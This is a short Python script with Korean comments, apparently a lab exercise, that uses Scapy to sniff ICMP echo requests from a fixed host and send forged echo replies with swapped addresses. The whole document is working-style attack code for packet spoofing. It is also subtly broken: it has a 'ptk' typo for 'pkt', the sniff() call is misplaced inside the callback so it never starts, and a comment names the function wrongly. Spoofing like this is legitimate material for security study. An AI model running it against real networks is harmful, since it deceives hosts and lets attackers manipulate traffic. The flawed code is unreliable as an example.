# Python 의 Scapy 라이브러리를 사용한 ICMP 스푸핑을 수행하고
# 해당 함수를 호출하는 패킷 스니핑 코드
def spoof_pkt(pkt):
    # ICMP 프로토콜 패킷이 존재하고, ICMP 타입이 8 (Echo Request)인 경우에만 참
    if ICMP in pkt and pkt[ICMP].type==8:
        # IP 헤더를 생성하고, 원래의 패킷의 목적지와 소스를 바꾼다
        ip = IP(src=pkt[IP].dst , dst=pkt[IP].src , ihl=ptk[IP].ihl)
        # TTL 을 99 로 설정
        ip.ttl = 99
        # ICMP 헤더를 설정
        # type=0 (Echo Reply) 로 설정
        # ID 와 Seq 는 원래 패킷에서 복사
        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)

        if pkt.haslayer(Raw):
            data = pkt[Raw].load
            newpkt = ip/icmp/data
        else:
            newpkt = ip/icmp
        
        send(newpkt, verbose=0)
    
    # sniff 함수를 사용하여 ICMP 패킷을 스니핑
    # ICMP 패킷 중에서 소스 호스트 IP가 10.0.2.7 인 패킷만을 필터링
    # 각각의 스니핑된 패킷에 대하여 spoff_pkt 함수 호출
    sniff(filter="icmp and src host 10.0.2.7" , prn=spoof_pkt)

    # 정리하면 스니핑으로 내가 원하는 패킷들을 필터링하고
    # 그 필터링된 패킷들을 가지고 스푸핑을 해서 조작하고 다시 전송한다.